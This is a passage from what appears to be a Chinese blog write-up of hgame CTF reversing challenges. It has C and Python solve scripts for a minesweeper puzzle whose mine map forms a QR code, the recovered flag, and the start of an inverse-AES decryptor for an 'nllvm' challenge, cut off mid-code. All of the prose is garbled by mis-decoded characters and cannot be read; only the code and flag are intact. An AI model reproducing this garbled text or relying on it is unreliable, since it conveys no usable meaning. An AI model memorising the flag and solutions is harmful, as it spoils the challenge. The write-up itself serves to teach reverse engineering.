src="https://i.loli.net/2021/02/27/e9vF4mky3D5oiHp.png" alt="image-20210227122637114"></p><p>ç‚¹å‡»åï¼Œæ ¹æ®æ˜¯é›·æˆ–è€…ä¸æ˜¯é›·å¡«å……å¯¹åº”çš„è‰²å—ï¼š</p><p><img src="https://i.loli.net/2021/02/27/kB8jiNXfsgQzJ4H.png" alt="image-20210227122902913"></p><p>å¦‚æœç‚¹å‡»å—å‘¨å›´æ²¡æœ‰é›·ï¼Œåˆ™é€’å½’çš„å‘å››ä¸ªæ–¹å‘æ‰©å±•å¼€æ¥ï¼š</p><p><img src="https://i.loli.net/2021/02/27/gD1dcpLSm9QAvo2.png" alt="image-20210227123011364"></p><p>åˆ†æåˆ°è¿™é‡Œæƒ³æ‰¾æœ€åèƒœåˆ©çš„åˆ¤æ–­æ¡ä»¶ä»¥æ­¤çœ‹flagæ€ä¹ˆæ¥çš„ï¼Œå¥½åƒæ²¡æœ‰ï¼Œã€‚ã€‚</p><p>åˆ°è¿™é‡ŒçŸ¥é“äº†å…³é”®å°±æ˜¯åˆ¤æ–­ä¸€ä¸ªå—æ˜¯å¦æ˜¯é›·çš„å‡½æ•°<strong>CheckBomAt</strong>ï¼ŒæŒ‰ç…§é¢˜ç›®çš„ç®—æ³•æ‰“å°å‡ºé›·çš„ä½ç½®ï¼Œ1è¡¨ç¤ºé›·ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> a[<span class="number">45</span>][<span class="number">15</span>][<span class="number">3</span>] = &#123;æ¸¸æˆä¸­çš„æ•°æ®&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">double</span> ans;</span><br><span class="line"><span class="keyword">double</span> a_, b_, c_, d_;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>, bomb[<span class="number">45</span>][<span class="number">45</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">45</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">a_ = a[j][i/<span class="number">3</span>][<span class="number">0</span>];</span><br><span class="line">b_ = a[j][i/<span class="number">3</span>][<span class="number">1</span>];</span><br><span class="line">c_ = a[j][i/<span class="number">3</span>][<span class="number">2</span>];</span><br><span class="line">d_ = (<span class="keyword">double</span>)(i%<span class="number">3</span> - <span class="number">1.0</span>);</span><br><span class="line">ans = (a_*d_*d_ + b_*d_) + c_;</span><br><span class="line">bomb[j][i] = ans &gt; <span class="number">0.0</span> ? <span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">45</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, bomb[i][j]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨è¿™ä¸ªæ•°æ®ç©äº†ä¸€ä¸‹æ¸¸æˆï¼Œä½†æ˜¯æœ‰çš„åœ°æ–¹å’Œç®—å‡ºçš„é›·çš„ä½ç½®ä¸ä¸€è‡´ï¼Œå¤§å¤šæ•°è¿˜æ˜¯ä¸€æ ·çš„ã€‚ã€‚ç„¶åä¸€ç›´æ‰¾æ˜¯ä¸æ˜¯å“ªé‡Œç®—é”™äº†ï¼Œç®—æ³•ä¹Ÿæ¯”å¯¹äº†å¥½å‡ æ¬¡ã€‚ã€‚å°±æŠŠé¢˜æ”¾ä¸€è¾¹äº†ã€‚</p><p>åé¢çœ‹è§é¢˜ç›®ç»™å‡ºæç¤ºï¼ŒäºŒç»´ç ï¼Œçœ‹äº†çœ‹æˆ‘ä¹‹å‰æ‰“å°çš„æ•°æ®ã€‚ã€‚ã€‚</p><p><img src="https://i.loli.net/2021/02/27/iQqyeAYgFaJVoMc.png" alt="image-20210227020942288"></p><p>ä½¿ç”¨pythonçš„PILæ¨¡å—ç”¨è¿™ä¸ªæ•°æ®æ‰“å°å‡ºäºŒç»´ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">x = <span class="number">45</span></span><br><span class="line">y = <span class="number">45</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">'RGB'</span>, (x, y))</span><br><span class="line">data = <span class="string">'111111100011101111100101000001110100101111111100000100001011111010001110100011001001000001101110101110100100000100111010100101001011101101110101101010111001001001001111101101011101101110101110001100101111111011101111101011101100000101011000100101000100011111000001000001111111101010101010101010101010101010101111111000000001100001101111000111101010000100000000101111100001111010101111111000000000101111100000100010001011011110010110001010001010000001000101111000011001000111010110100010011001110010100001000010001111010011000100111000001100100110101111100101101101010101110010010101001010001011101001011011101100000101101110000110010000111101101001010000100101110010010101100101111011101101110000101111101101101000100110110100101000010101010000101010100001110011100000010001001001000100010111111101101100111000011110100010000010100111000011011001010010011000001010101101011111000000101010011011011001011111111100110100101111110001000110111110111111110001100000011111000100011110010100011101001010101001011101011010110010000101101011010101110001100001010011000110010100011100011100001111111101110011011111110001111110111110001111110011111001100101101000010101001001101001100100110100111010001011001011111111011110010010011001000011110111111111101001000100011111011001111110011100011010101010010100001111000011011011001000001000100011111010000111001000100100101001100110001101100010111110010000011011101010111101010100000100001101011010011001110011100010111111000101110101110110010100111001110010111010001101000100001110010100010110000010111111000000010010110100110101110111100011110011101001101111111011001100100011010110100110100011100010011111101000111000111111100000000001110101000011000111001101101100010100111111100101011000101010100000011000101011110100000101100000110101000111001010110100011111101110101111001110001111110000000101111110000101110101111010011010010010011010001111001111101110101110100010000101010010100100101101100100000100111010110100001100000101111111001100111111101000101001110100110101100000100100010'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, y):</span><br><span class="line">        line = data[i*x+j]</span><br><span class="line">        <span class="keyword">if</span> line == <span class="string">'1'</span>:</span><br><span class="line">            im.putpixel((i, j), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            im.putpixel((i, j), (<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>))</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><p>æ‰«ä¸€ä¸‹å¾—åˆ°flagï¼š<strong>hgame{YOU<del>hEn-duO_yOU-X|</del>DOU-sHi<del>un1Ty</del>k4i-fA_de_O}</strong></p><h3 id="nllvm"><a href="#nllvm" class="headerlink" title="nllvm"></a>nllvm</h3><p>ä¸€è¡€ã€‚</p><p>é€šè¿‡è¿™ä¸ªé¢˜å­¦ä¹ ç†Ÿæ‚‰ä¸‹AESåŠ å¯†ç®—æ³•è¿˜æ˜¯ä¸é”™çš„ã€‚</p><p>é¦–å…ˆçœ‹ä¸€ä¸‹mainå‡½æ•°ï¼šå…ˆè®¾ç½®æ§åˆ¶å°æ˜¾ç¤ºæ–‡æœ¬çš„å±æ€§ï¼Œæ¥ç€å¯ä»¥çœ‹åˆ°å¾ˆå¤šå¼‚æˆ–è¿ç®—ï¼Œè¿™äº›æ•°æ®åœ¨è¦ä½¿ç”¨ååŒæ ·åšäº†ç›¸åŒçš„å¼‚æˆ–è¿ç®—ï¼Œæ‰€ä»¥ç®€å•éšè—äº†ä¸‹ç¨‹åºä¸­çš„æ•°æ®ã€‚</p><p><img src="https://i.loli.net/2021/02/27/p7NOiGZoXHwMrKW.png" alt="image-20210223230432003"></p><p>æ‰¾åˆ°åŠ å¯†çš„åœ°æ–¹ï¼Œå¼€å§‹é™æ€çœ‹äº†ä¸€ä¸‹æ•´ä¸ªåŠ å¯†æµç¨‹ï¼Œåªæ˜¯æ³¨æ„åˆ°å¾ˆå¤šå¼‚æˆ–è¿ç®—ä¹Ÿä¸å¤æ‚ï¼Œåœ¨ä¸€ä¸ªç½®ä½çš„åœ°æ–¹å‘ç°åŠ å¯†åçš„ä¸€ä¸ªaesçš„s-boxã€‚</p><p>ç¡®å®šaesåŠ å¯†åï¼Œåˆè¿›è€Œå‘ç°æ˜¯å¸¦æœ‰ivçš„ã€‚</p><p><img src="https://i.loli.net/2021/02/27/cpix3L91BESXuGe.png" alt="image-20210223231923153"></p><p>å†æ¢³ç†äº†ä¸€ä¸‹è¿™é‡Œçš„åŠ å¯†æµç¨‹ï¼š</p><p><img src="https://i.loli.net/2021/02/27/WRM9vQi1HZD8O7e.png" alt="image-20210223233754450"></p><p>å¯ä»¥ä»é‡å¤è½®è¿›è¡Œäº†13æ¬¡å¯ä»¥çŸ¥é“keyæ˜¯256ä½çš„ï¼Œä½†å—é•¿åº¦æ˜¯128ä½çš„ã€‚ã€‚ä¹‹å‰ä¸€ç›´ä»¥ä¸ºå¯†é’¥é•¿åº¦å’Œå—é•¿åº¦æ˜¯ä¸€æ ·çš„ã€‚åˆåŠ ä¸Šè¿™é‡Œç§»ä½å’Œæ··åˆçš„æ–¹å‘å’Œæˆ‘ä¹‹å‰äº†è§£çš„æ­£å¥½ç›¸åï¼Œå°±æ„Ÿè§‰æ˜¯é­”æ”¹è¿‡çš„aesåŠ å¯†ï¼Œå¼€å§‹ç”¨Cè‡ªå·±å†™é€†è¿‡ç¨‹ï¼Œå…³é”®å°±æ˜¯è¡Œæ··åˆä¸å¥½å†™ï¼Œè¿˜å¥½æœ‰æœç´¢ï¼Œhhã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> rsbox[<span class="number">256</span>] = &#123;</span><br><span class="line">  <span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6a</span>, <span class="number">0xd5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xa5</span>, <span class="number">0x38</span>, <span class="number">0xbf</span>, <span class="number">0x40</span>, <span class="number">0xa3</span>, <span class="number">0x9e</span>, <span class="number">0x81</span>, <span class="number">0xf3</span>, <span class="number">0xd7</span>, <span class="number">0xfb</span>,</span><br><span class="line">  <span class="number">0x7c</span>, <span class="number">0xe3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9b</span>, <span class="number">0x2f</span>, <span class="number">0xff</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8e</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xc4</span>, <span class="number">0xde</span>, <span class="number">0xe9</span>, <span class="number">0xcb</span>,</span><br><span class="line">  <span class="number">0x54</span>, <span class="number">0x7b</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xa6</span>, <span class="number">0xc2</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0xee</span>, <span class="number">0x4c</span>, <span class="number">0x95</span>, <span class="number">0x0b</span>, <span class="number">0x42</span>, <span class="number">0xfa</span>, <span class="number">0xc3</span>, <span class="number">0x4e</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x2e</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xd9</span>, <span class="number">0x24</span>, <span class="number">0xb2</span>, <span class="number">0x76</span>, <span class="number">0x5b</span>, <span class="number">0xa2</span>, <span class="number">0x49</span>, <span class="number">0x6d</span>, <span class="number">0x8b</span>, <span class="number">0xd1</span>, <span class="number">0x25</span>,</span><br><span class="line">  <span class="number">0x72</span>, <span class="number">0xf8</span>, <span class="number">0xf6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xd4</span>, <span class="number">0xa4</span>, <span class="number">0x5c</span>, <span class="number">0xcc</span>, <span class="number">0x5d</span>, <span class="number">0x65</span>, <span class="number">0xb6</span>, <span class="number">0x92</span>,</span><br><span class="line">  <span class="number">0x6c</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xfd</span>, <span class="number">0xed</span>, <span class="number">0xb9</span>, <span class="number">0xda</span>, <span class="number">0x5e</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xa7</span>, <span class="number">0x8d</span>, <span class="number">0x9d</span>, <span class="number">0x84</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x00</span>, <span class="number">0x8c</span>, <span class="number">0xbc</span>, <span class="number">0xd3</span>, <span class="number">0x0a</span>, <span class="number">0xf7</span>, <span class="number">0xe4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0xb3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</span><br><span class="line">  <span class="number">0xd0</span>, <span class="number">0x2c</span>, <span class="number">0x1e</span>, <span class="number">0x8f</span>, <span class="number">0xca</span>, <span class="number">0x3f</span>, <span class="number">0x0f</span>, <span class="number">0x02</span>, <span class="number">0xc1</span>, <span class="number">0xaf</span>, <span class="number">0xbd</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8a</span>, <span class="number">0x6b</span>,</span><br><span class="line">  <span class="number">0x3a</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4f</span>, <span class="number">0x67</span>, <span class="number">0xdc</span>, <span class="number">0xea</span>, <span class="number">0x97</span>, <span class="number">0xf2</span>, <span class="number">0xcf</span>, <span class="number">0xce</span>, <span class="number">0xf0</span>, <span class="number">0xb4</span>, <span class="number">0xe6</span>, <span class="number">0x73</span>,</span><br><span class="line">  <span class="number">0x96</span>, <span class="number">0xac</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xe7</span>, <span class="number">0xad</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xe2</span>, <span class="number">0xf9</span>, <span class="number">0x37</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0x75</span>, <span class="number">0xdf</span>, <span class="number">0x6e</span>,</span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0xf1</span>, <span class="number">0x1a</span>, <span class="number">0x71</span>, <span class="number">0x1d</span>, <span class="number">0x29</span>, <span class="number">0xc5</span>, <span class="number">0x89</span>, <span class="number">0x6f</span>, <span class="number">0xb7</span>, <span class="number">0x62</span>, <span class="number">0x0e</span>, <span class="number">0xaa</span>, <span class="number">0x18</span>, <span class="number">0xbe</span>, <span class="number">0x1b</span>,</span><br><span class="line">  <span class="number">0xfc</span>, <span class="number">0x56</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0xc6</span>, <span class="number">0xd2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9a</span>, <span class="number">0xdb</span>, <span class="number">0xc0</span>, <span class="number">0xfe</span>, <span class="number">0x78</span>, <span class="number">0xcd</span>, <span class="number">0x5a</span>, <span class="number">0xf4</span>,</span><br><span class="line">  <span class="number">0x1f</span>, <span class="number">0xdd</span>, <span class="number">0xa8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xc7</span>, <span class="number">0x31</span>, <span class="number">0xb1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>,</span><br><span class="line">  <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7f</span>, <span class="number">0xa9</span>, <span class="number">0x19</span>, <span class="number">0xb5</span>, <span class="number">0x4a</span>, <span class="number">0x0d</span>, <span class="number">0x2d</span>, <span class="number">0xe5</span>, <span class="number">0x7a</span>, <span class="number">0x9f</span>, <span class="number">0x93</span>, <span class="number">0xc9</span>, <span class="number">0x9c</span>, <span class="number">0xef</span>,</span><br><span class="line">  <span class="number">0xa0</span>, <span class="number">0xe0</span>, <span class="number">0x3b</span>, <span class="number">0x4d</span>, <span class="number">0xae</span>, <span class="number">0x2a</span>, <span class="number">0xf5</span>, <span class="number">0xb0</span>, <span class="number">0xc8</span>, <span class="number">0xeb</span>, <span class="number">0xbb</span>, <span class="number">0x3c</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0x2b</span>, <span class="number">0x04</span>, <span class="number">0x7e</span>, <span class="number">0xba</span>, <span class="number">0x77</span>, <span class="number">0xd6</span>, <span class="number">0x26</span>, <span class="number">0xe1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0c</span>, <span class="number">0x7d</span> &#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[] = &#123;<span class="number">0x43</span>, <span class="number">0x72</span>, <span class="number">0x79</span>, <span class="number">0x70</span>, <span class="number">0x74</span>, <span class="number">0x6f</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x4c</span>, <span class="number">0x55</span>, <span class="number">0x52</span>, <span class="number">0x45</span>, <span class="number">0x66</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x41</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x34</span>, <span class="number">0x38</span>, <span class="number">0x4b</span>, <span class="number">0x65</span>, <span class="number">0x79</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0xbf</span>, <span class="number">0x8f</span>, <span class="number">0x84</span>, <span class="number">0x8d</span>, <span class="number">0xcb</span>, <span class="number">0xe0</span>, <span class="number">0xc2</span>, <span class="number">0xcc</span>, <span class="number">0x82</span>, <span class="number">0xac</span>, <span class="number">0x97</span>, <span class="number">0x9e</span>, <span class="number">0xc7</span>, <span class="number">0xca</span>, <span class="number">0xf8</span>, <span class="number">0xec</span>, <span class="number">0x94</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0xfc</span>, <span class="number">0xa4</span>, <span class="number">0x13</span>, <span class="number">0x38</span>, <span class="number">0xb7</span>, <span class="number">0xc1</span>, <span class="number">0x6a</span>, <span class="number">0x19</span>, <span class="number">0x96</span>, <span class="number">0xe0</span>, <span class="number">0x4b</span>, <span class="number">0x38</span>, <span class="number">0xb7</span>, <span class="number">0x0e</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>, <span class="number">0x6c</span>, <span class="number">0xc5</span>, <span class="number">0x68</span>, <span class="number">0xef</span>, <span class="number">0xa0</span>, <span class="number">0x47</span>, <span class="number">0xc4</span>, <span class="number">0x78</span>, <span class="number">0x3e</span>, <span class="number">0x80</span>, <span class="number">0x0e</span>, <span class="number">0x80</span>, <span class="number">0xd2</span>, <span class="number">0x59</span>, <span class="number">0x8c</span>, <span class="number">0xcd</span>, <span class="number">0x49</span>, <span class="number">0xfd</span>, <span class="number">0x9f</span>, <span class="number">0xf5</span>, <span class="number">0xfe</span>, <span class="number">0x3c</span>, <span class="number">0xf5</span>, <span class="number">0xec</span>, <span class="number">0x68</span>, <span class="number">0xdc</span>, <span class="number">0xbe</span>, <span class="number">0xd4</span>, <span class="number">0xdf</span>, <span class="number">0xa4</span>, <span class="number">0xc0</span>, <span class="number">0xb3</span>, <span class="number">0xea</span>, <span class="number">0x61</span>, <span class="number">0xa8</span>, <span class="number">0x5c</span>, <span class="number">0x4a</span>, <span class="number">0x26</span>, <span class="number">0x6c</span>, <span class="number">0x24</span>, <span class="number">0x74</span>, <span class="number">0xa6</span>, <span class="number">0x62</span>, <span class="number">0xa4</span>, <span class="number">0xa6</span>, <span class="number">0x7d</span>, <span class="number">0x26</span>, <span class="number">0x84</span>, <span class="number">0x6d</span>, <span class="number">0x80</span>, <span class="number">0xb9</span>, <span class="number">0x71</span>, <span class="number">0x93</span>, <span class="number">0xbc</span>, <span class="number">0x4c</span>, <span class="number">0x9d</span>, <span class="number">0xfb</span>, <span class="number">0x60</span>, <span class="number">0xf2</span>, <span class="number">0x49</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0xfb</span>, <span class="number">0x85</span>, <span class="number">0x3a</span>, <span class="number">0x44</span>, <span class="number">0x53</span>, <span class="number">0xd9</span>, <span class="number">0x70</span>, <span class="number">0x62</span>, <span class="number">0x3f</span>, <span class="number">0xfd</span>, <span class="number">0x04</span>, <span class="number">0xc4</span>, <span class="number">0x5d</span>, <span class="number">0x59</span>, <span class="number">0xa2</span>, <span class="number">0x61</span>, <span class="number">0x6a</span>, <span class="number">0x4f</span>, <span class="number">0x57</span>, <span class="number">0xe1</span>, <span class="number">0xd3</span>, <span class="number">0x3e</span>, <span class="number">0xc4</span>, <span class="number">0x5d</span>, <span class="number">0x9f</span>, <span class="number">0xa3</span>, <span class="number">0x3f</span>, <span class="number">0x3d</span>, <span class="number">0x6d</span>, <span class="number">0xea</span>, <span class="number">0x1b</span>, <span class="number">0x09</span>, <span class="number">0x7c</span>, <span class="number">0x2a</span>, <span class="number">0x1d</span>, <span class="number">0x4d</span>, <span class="number">0x2f</span>, <span class="number">0xf3</span>, <span class="number">0x6d</span>, <span class="number">0x2f</span>, <span class="number">0x10</span>, <span class="number">0x0e</span>, <span class="number">0x69</span>, <span class="number">0xeb</span>, <span class="number">0x4d</span>, <span class="number">0x57</span>, <span class="number">0xcb</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x14</span>, <span class="number">0x48</span>, <span class="number">0x69</span>, <span class="number">0x5a</span>, <span class="number">0x2a</span>, <span class="number">0x8c</span>, <span class="number">0x34</span>, <span class="number">0xc5</span>, <span class="number">0x89</span>, <span class="number">0xb3</span>, <span class="number">0x09</span>, <span class="number">0xa8</span>, <span class="number">0x63</span>, <span class="number">0xa8</span>, <span class="number">0xeb</span>, <span class="number">0x87</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xa8</span>, <span class="number">0x1b</span>, <span class="number">0x71</span>, <span class="number">0x89</span>, <span class="number">0xb8</span>, <span class="number">0x15</span>, <span class="number">0x18</span>, <span class="number">0x62</span>, <span class="number">0xf5</span>, <span class="number">0x42</span>, <span class="number">0xd3</span>, <span class="number">0x22</span>, <span class="number">0x6f</span>, <span class="number">0x38</span>, <span class="number">0x2e</span>, <span class="number">0x4b</span>, <span class="number">0x35</span>, <span class="number">0x12</span>, <span class="number">0xa2</span>, <span class="number">0x7f</span>, <span class="number">0xf0</span>, <span class="number">0x9b</span>, <span class="number">0x11</span>, <span class="number">0x76</span>, <span class="number">0x58</span>, <span class="number">0xf8</span>, <span class="number">0xb9</span>, <span class="number">0xc1</span>, <span class="number">0xc6</span>, <span class="number">0xbe</span>, <span class="number">0x24</span>, <span class="number">0x67</span>, <span class="number">0x6e</span>, <span class="number">0xa5</span>, <span class="number">0x55</span>, <span class="number">0xee</span>, <span class="number">0xd6</span>, <span class="number">0xb0</span>, <span class="number">0x4d</span>, <span class="number">0x8c</span>, <span class="number">0x23</span>, <span class="number">0xf2</span>, <span class="number">0x9e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">xtime</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((x&lt;&lt;<span class="number">1</span>) ^ (((x&gt;&gt;<span class="number">7</span>) &amp; <span class="number">1</span>) * <span class="number">0x1b</span>))&amp;<span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">Multiply</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> x, <span class="keyword">unsigned</span> <span class="keyword">char</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (((y &amp; <span class="number">1</span>) * x) ^</span><br><span class="line">       ((y&gt;&gt;<span class="number">1</span> &amp; <span class="number">1</span>) * xtime(x)) ^</span><br><span class="line">       ((y&gt;&gt;<span class="number">2</span> &amp; <span class="number">1</span>) * xtime(xtime(x))) ^</span><br><span class="line">       ((y&gt;&gt;<span 